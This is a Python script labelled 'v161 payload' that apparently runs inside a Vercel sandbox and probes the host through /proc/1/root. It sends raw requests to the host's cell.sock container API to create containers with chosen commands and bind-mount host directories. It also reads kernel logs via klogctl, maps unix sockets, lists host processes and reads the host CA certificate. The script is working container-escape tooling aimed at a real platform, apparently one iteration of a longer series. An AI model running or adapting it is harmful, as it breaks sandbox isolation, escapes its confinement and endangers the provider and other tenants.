# -*- coding: utf-8 -*-
"""v161 payload: /dev/kmsg 读 runc 失败日志 + command 格式测试 + socket 映射
输出 /vercel/sandbox/v161c.out"""
import socket, struct, time, json, os, signal, re, stat as stat_mod

OUT = '/vercel/sandbox/v161c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def read_kmsg(n_bytes=30000):
    """读内核日志 (kmsg) 尾部"""
    try:
        with open('/dev/kmsg', 'rb') as k:
            # kmsg 只读当前时间点之后的新消息? 用 dmesg 风格: 读全部可能阻塞
            # 改为用 SYSLOG_ACTION_READ_ALL via klogctl
            import ctypes
            libc = ctypes.CDLL(None, use_errno=True)
            buf = ctypes.create_string_buffer(1 << 20)
            n = libc.klogctl(3, buf, 1 << 20)  # 3 = SYSLOG_ACTION_READ_ALL
            if n > 0:
                return buf.raw[:n]
            return b'klogctl err=%d' % ctypes.get_errno()
    except Exception as e:
        return b'kmsg EXC %s' % str(e).encode()


def unix_sockets():
    """/proc/net/unix 带路径的 socket"""
    try:
        for ln in open('/proc/net/unix').read().splitlines()[1:]:
            p = ln.split()
            if len(p) >= 8 and p[6].startswith('/'):
                log('unix %s %s %s' % (p[6], p[1], p[4]))
    except Exception as e:
        log('unix EXC %s' % e)


# ============ 1: kmsg 读内核日志 (runc 失败线索) ============
log('=== 1 kmsg ===')
d = read_kmsg()
log('kmsg len=%d' % len(d))
for m in re.finditer(rb'[^\n]*?(?:runc|container|overlay|mount|failed|error)[^\n]*', d, re.I):
    seg = m.group()[:300]
    log('KMSG %r' % seg)
    if len(seg) >= 300:
        break

# ============ 2: unix socket 映射 ============
log('=== 2 unix socks ===')
unix_sockets()

# ============ 3: Create 失败后 kmsg 增量 ============
log('=== 3 create diag ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'echo hi'}).encode(), t=8)
log('Create cmd=echo hi -> %s %r' % (st, pay[:300]))
time.sleep(0.3)
d2 = read_kmsg()
log('kmsg after len=%d' % len(d2))
new = d2[len(d):] if d2.startswith(d[:100]) else b''
if not new and len(d2) > len(d):
    new = d2[-4000:]
log('kmsg delta %r' % new[:3000])

# ============ 4: command 格式测试 ============
log('=== 4 cmd formats ===')
for cmd in ['sleep', 'sleep 300', '/bin/sleep 300', 'echo hi', '/bin/echo hi',
            '/bin/sh', 'sh -c echo hi', '/bin/true']:
    st, pay = raw_req(CELL, '%s/Create' % CTRS,
                      json.dumps({'drive_id': 'sandbox', 'command': cmd}).encode(), t=8)
    log('Create cmd=%r -> %s %r' % (cmd, st, pay[:250]))
    if '200' in st:
        m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
        if m:
            cid = m.group(1).decode()
            log('  SUCCESS cid=%s' % cid)
            time.sleep(1)
            for d in sorted(os.listdir('/proc')):
                if d.isdigit():
                    try:
                        comm = open('/proc/%s/comm' % d).read().strip()
                    except Exception:
                        continue
                    if comm in ('sleep', 'sh', 'runc', 'init', 'echo', 'true'):
                        try:
                            cl = open('/proc/%s/cmdline' % d).read()[:100].replace('\x00', ' ')
                        except Exception:
                            cl = '?'
                        log('  proc %s comm=%s cmd=%s' % (d, comm, cl))
            try:
                for e in sorted(os.listdir(R + '/run/cell/runc')):
                    log('  runc dir %s' % e)
            except Exception:
                pass
            break

# ============ 5: Mount 验证 ============
log('=== 5 mount verify ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS, json.dumps({'drive_id': 'sandbox'}).encode(), t=8)
log('Create plain -> %s %r' % (st, pay[:250]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
if cid:
    mi0 = open('/proc/1/mountinfo').read()
    cnt0 = len(mi0.splitlines())
    st, pay = raw_req(CELL, '%s/Mount' % CTRS,
                      json.dumps({'container_id': cid, 'mounts': [{'bind': {'source': '/tmp', 'destination': '/mnt/x'}}]}).encode(), t=5)
    log('Mount bind -> %s %r' % (st, pay[:250]))
    time.sleep(0.5)
    mi1 = open('/proc/1/mountinfo').read()
    cnt1 = len(mi1.splitlines())
    log('mountinfo %d -> %d lines' % (cnt0, cnt1))

# ============ 6: ca-cert.pem 内容 ============
log('=== 6 ca-cert ===')
try:
    d = open(R + '/run/cell/ca-cert.pem', 'rb').read()
    log('ca-cert len=%d head=%r' % (len(d), d[:600]))
except Exception as e:
    log('ca-cert EXC %s' % e)

log('V161_DONE')
f.close()
